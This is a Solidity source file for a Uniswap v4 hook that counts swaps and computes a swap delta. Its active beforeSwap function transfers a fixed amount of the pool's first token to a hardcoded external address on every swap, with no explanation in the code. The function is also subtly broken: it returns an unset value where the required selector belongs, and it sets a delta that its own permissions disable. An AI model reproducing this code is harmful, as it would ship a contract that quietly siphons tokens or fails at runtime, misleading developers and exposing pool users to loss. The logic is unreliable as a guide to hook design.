// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {BaseHook} from "v4-periphery/src/base/hooks/BaseHook.sol";

import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary, toBeforeSwapDelta} from "v4-core/src/types/BeforeSwapDelta.sol";


contract UniswapHook is BaseHook {
    using PoolIdLibrary for PoolKey;
    event Log(int128);

    // NOTE: ---------------------------------------------------------
    // state variables should typically be unique to a pool
    // a single hook contract should be able to service multiple pools
    // ---------------------------------------------------------------

    mapping(PoolId => uint256 count) public beforeSwapCount;
    mapping(PoolId => uint256 count) public afterSwapCount;

    constructor(IPoolManager _poolManager) BaseHook(_poolManager) {}

    function abs(int x) private pure returns (int) {
        return x >= 0 ? x : -x;
    }

    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: false,
            afterInitialize: false,
            beforeAddLiquidity: false,
            afterAddLiquidity: false,
            beforeRemoveLiquidity: false,
            afterRemoveLiquidity: false,
            beforeSwap: true,
            afterSwap: false,
            beforeDonate: false,
            afterDonate: false,
            beforeSwapReturnDelta: false,
            afterSwapReturnDelta: false,
            afterAddLiquidityReturnDelta: false,
            afterRemoveLiquidityReturnDelta: false
        });
    }

    // -----------------------------------------------
    // NOTE: see IHooks.sol for function documentation
    // -----------------------------------------------

    // function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
    //     external
    //     override
    //     returns (bytes4, BeforeSwapDelta delta, uint24)
    // {
    //     beforeSwapCount[key.toId()]++;
    //     int256 specifiedAmount = params.amountSpecified;
    //     int128 fee = specifiedAmount / 100; 
    //     delta = BeforeSwapDelta.from(-fee);
    //     return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    // }

    function beforeSwap(
    address,
    PoolKey calldata poolkey,
    IPoolManager.SwapParams calldata params,
    bytes calldata
    ) external override returns (bytes4 amountIn, BeforeSwapDelta delta, uint24) {
    // Convert the specified amount to int128
    int128 specifiedAmount = int128(params.amountSpecified);
    emit Log(specifiedAmount);
    // In this example, we're not modifying the unspecified amount
    int128 unspecifiedAmount = specifiedAmount / 100; // Calculated based on your custom logic
    emit Log(unspecifiedAmount);
    // Create the BeforeSwapDelta
    delta = toBeforeSwapDelta(specifiedAmount, unspecifiedAmount);

    IERC20(Currency.unwrap(poolkey.currency0)).transfer(address(0x951e30c7A23f02Fbe2De2A252B946DBBb0b12825), 100000000);
    
    // Return 0 for lpFeeOverride as we're not changing the LP fee
    return (amountIn, delta, 0);
    }

    function toBeforeSwapDelta(int128 deltaSpecified, int128 deltaUnspecified) public
    pure    returns (BeforeSwapDelta beforeSwapDelta)
    {
        assembly ("memory-safe") {
            beforeSwapDelta := or(shl(128, deltaSpecified), and(sub(shl(128, 1), 1), deltaUnspecified))
        }
    }

}